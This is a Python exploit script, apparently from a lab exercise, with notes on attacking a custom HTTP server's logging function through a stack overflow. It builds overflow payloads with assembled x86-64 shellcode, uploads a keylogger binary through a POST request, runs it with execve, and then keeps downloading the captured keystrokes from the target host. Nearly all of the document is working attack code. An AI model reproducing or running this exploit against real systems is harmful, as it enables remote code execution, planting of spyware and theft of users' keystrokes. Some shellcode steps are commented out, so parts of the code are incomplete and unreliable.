'''
[FINDINGS]
General flow:
1) Sent request
2) handle_client: Receives the whole request and sends the response back to the client using its file descriptor after rest of processing
3) parse_request: Parses the request in arg:request_buf, logs only (!!) the request header, receives any remaining body data, 
                  executes the request, and builds a response in arg:response_buf
4) log_message: Logs arg:message to stdout and to a file

In the handle_client function a space of 0x500018 is allocated on the stack in comparison to 0x518 in scenario 1.
So we have space for approx 5114 KB instead of the previous 1 KB which offers us enough space to also store the keylogger.
This space is mostly used for the request_buffer of parse_request which is 0x4fffff big.

Next the goal is the same as in scenario 1, crash the server so N = 1 again and next sent the payload to run the keylogger,
but now we also need to sent the keylogger first and execute this keylogger which is now located on the stack in the space
from previous alinea.

So next we want to sent the keylogger to the server and execute it.
To do this we don't put the keylogger inside the stack frame of log_message but just append it after the payload.
This way it doesn't get written to log_message but is still on the stack in the buffer of handle_client.
Now we can get the start address of this buffer and thus also the start address of the keylogger.
Next we want to write the keylogger data on the stack to a file and execute it.
To do this we need to create a new file, write the keylogger data to this file and execute it.
Some problems arise here, many issues due to the fact that the used addresses aren't 64 bits long.
That is why we shifted the addresses to 64 bits to sent the payload, but in the shellcode we need to shift them back to their original length.

The problem is that the keylogger is too big to write in one go to the file.
Sometimes it only finds 90 bytes, sometimes more and in very rare cases the full keylogger.
After printing $rbx in handle_client after recv@pl, to see the length of the total received data in the buffer, it also appears to be sort of random.
Thus file is never fully stored and the rest is filled with null bytes, causing an error when ran.
Howerever when using nc -l -p 8080, it prints the full file, thus the server receives it but doesn't put it in the buffer for some reason. 

To solve this issue, we can first create the file and write on the server using the same method as in scenario 1.
Next we can do a POST request to the server to sent the keylogger data and put it in the keylogger file.
Finally we can again sent a scenario 1 alike exploit and run the keylogger using execv.

[EXPLOIT SUMMARY]
1) Send crash payload
2) Send log_message exploit to create keylogger file
3) Send keylogger data using POST request
4) Send run keylogger exploit
'''

from keystone import *
from pwn import *

### CONFIGS ###
host = "192.168.1.4"
port = 8086
original_rbp = 0x7ffff7ad1920 
keylogger_start_address = 0x7ffff75cf2d1
log_buffer_rbp_offset = 0x450 # the log buffer starts at $original_rbp-0x450
log_buffer_prefix = 49 # the server already adds 49 bytes at start of the log buffer

### FUNCTIONS ###
def download_data_file():
    url = f"http://{host}:{port}/logged_keyboard_events.txt"
    local_path = './scenario_3/logged_keyboard_events.txt'

    try:
        # Download the file using wget
        wget(url, local_path)

        print(f"File downloaded successfully to {local_path}")

    except Exception as e:
        print(f"Failed to download file. Error: {e}")

### PAYLOAD ###
message_prefix = b"GET /data.txt HTTP/1.1\r\n"
message_prefix_len = len(message_prefix)

### CREATE THE CRASH PAYLOAD ###
crash = message_prefix
padding_size = log_buffer_rbp_offset + 8 - log_buffer_prefix - len(crash) # extra 8 bytes to account for the caller's rbp
crash += b"q" * padding_size # add padding
crash += 0xffffffffffffffff.to_bytes(8, "little") # add new little endian return address
crash += b"\r\n\r\n"


### CREATE THE ATTACK PAYLOAD ###
# Load the keylogger binary file keylogger.exe
with open("./scenario_3/keylogger", "rb") as file:
  keylogger = file.read()
  
# Get the keylogger
keylogger = bytes(keylogger)

# Get keylogger length
keylogger_len = len(keylogger)

added_keylogger_len_bits = 32 - keylogger_len.bit_length()
added_keylogger_len_bits = added_keylogger_len_bits - (added_keylogger_len_bits % 4)

keylogger_len = '{:b}'.format(keylogger_len)
keylogger_len_32bit = keylogger_len + '1' * added_keylogger_len_bits
keylogger_len_32bit = hex(int(keylogger_len_32bit, 2))

added_keylogger_start_bits = 64 - keylogger_start_address.bit_length()
added_keylogger_start_bits = added_keylogger_start_bits - (added_keylogger_start_bits % 4)

keylogger_start_address = '{:b}'.format(keylogger_start_address)
keylogger_start_address_64bit = keylogger_start_address + '1' * added_keylogger_start_bits
keylogger_start_address_64bit = hex(int(keylogger_start_address_64bit, 2))

# File name
keylogger_name = b"./keylogger"
keylogger_name_len = len(keylogger_name)
placeholder = b"12345678"
placeholder_len = len(placeholder)

payload_rsp_offset = 0x10 + log_buffer_rbp_offset - log_buffer_prefix - message_prefix_len

# Shell code the runs the keylogger
create_keylogger_shell_code = f"""
  # Create new file
  lea rdi, [rsp-{payload_rsp_offset}] # ptr to "./keylogger"
  lea rsi, [rsp-{payload_rsp_offset - keylogger_name_len}] # argv
  lea rdx, [rsp-{payload_rsp_offset - keylogger_name_len}] # envp
  xor rdx, rdx                                
  mov [rsi], rdx  
  xor rsi, rsi
  mov sil, 102                                
  xor rdx, rdx
  mov dx, 0777                              
  mov al, 2 
  syscall
  
  # Write to the file
  # mov rdi, rax                                # load file descriptor into rdi
  # mov rsi, {keylogger_start_address_64bit}                   # address of data to write
  # shr rsi, {added_keylogger_start_bits}                 # Shift it back to to original length
  # mov edx, {keylogger_len_32bit}                      # length of data
  # shr edx, {added_keylogger_len_bits}          # Shift it back to to original length
  # mov al, 1                                   # system call number for write
  # syscall
    
  # Close the file
  mov rdi, rax                               
  mov al, 3
  syscall

  # Execute the keylogger
  # lea rdi, [rsp-{payload_rsp_offset}] # ptr to "./keylogger"
  # lea rsi, [rsp-{payload_rsp_offset - keylogger_name_len}] # argv
  # lea rdx, [rsp-{payload_rsp_offset - keylogger_name_len}] # envp 
  # mov al, 59
  # syscall
"""

ks = Ks(KS_ARCH_X86, KS_MODE_64)
encoding, _ = ks.asm(create_keylogger_shell_code)

# build the payload
create_keylogger = message_prefix
create_keylogger += keylogger_name + placeholder
create_keylogger += bytes(encoding) # add assembled shell code
padding_size = log_buffer_rbp_offset + 8 - log_buffer_prefix - len(create_keylogger) # len includes the 24 bytes
create_keylogger += b"q" * padding_size # add padding
retaddr = original_rbp - log_buffer_rbp_offset + log_buffer_prefix + message_prefix_len + keylogger_name_len + placeholder_len # the new (absolute) return address points to the first byte of the shell code
create_keylogger += retaddr.to_bytes((retaddr.bit_length() + 7) // 8, byteorder = "little") # add new little endian return address without trailing null bytes
create_keylogger += b"\r\n\r\n"
create_keylogger += keylogger


### CREATE THE POST PAYLOAD ###
post_keylogger = b"POST /keylogger HTTP/1.1\r\n"
post_keylogger += b"Content-Length: " + str(len(keylogger)).encode() + b"\r\n"
post_keylogger += b"\r\n"  
post_keylogger += keylogger

### CREATE THE RUN PAYLOAD ###
run_keylogger_shell_code = f"""
  # Fork the process
  # xor rax, rax           
  # mov rax, 57             
  # syscall

  # Execute the keylogger
  lea rdi, [rsp-{payload_rsp_offset}] # Ptr to "./keylogger"
  lea rsi, [rsp-{payload_rsp_offset - keylogger_name_len}] # argv
  lea rdx, [rsp-{payload_rsp_offset - keylogger_name_len}] # envp 
  xor rax, rax
  mov [rdx], rax
  mov al, 59
  syscall
"""

ks = Ks(KS_ARCH_X86, KS_MODE_64)
encoding, _ = ks.asm(run_keylogger_shell_code)

# build the payload
run_keylogger = message_prefix
run_keylogger += keylogger_name + placeholder # add the argument datasc1_exploit += bytes(encoding0 # add assembled shell code
run_keylogger += bytes(encoding) # add assembled shell code
padding_size = log_buffer_rbp_offset + 8 - log_buffer_prefix - len(run_keylogger) # len includes the 24 bytes
run_keylogger += b"q" * padding_size # add padding
retaddr = original_rbp - log_buffer_rbp_offset + log_buffer_prefix + message_prefix_len + keylogger_name_len + placeholder_len # the new (absolute) return address points to the first byte of the shell code
run_keylogger += retaddr.to_bytes((retaddr.bit_length() + 7) // 8, byteorder = "little") # add new little endian return address without trailing null bytes
run_keylogger += b"\r\n\r\n"

### PERFORM ATTACK ###
#remote("localhost", port).send(crash) # send crash payload
# sleep(2) # let the server restart
# Perform Attack
remote(host, port).send(create_keylogger) # send attack payload
sleep(2) 
remote(host, port).send(post_keylogger) # send post payload
sleep(2) 
remote(host, port).send(run_keylogger) 
sleep(10)
print("Fetching the keylogged data...")
while True:
  download_data_file()
  sleep(10)
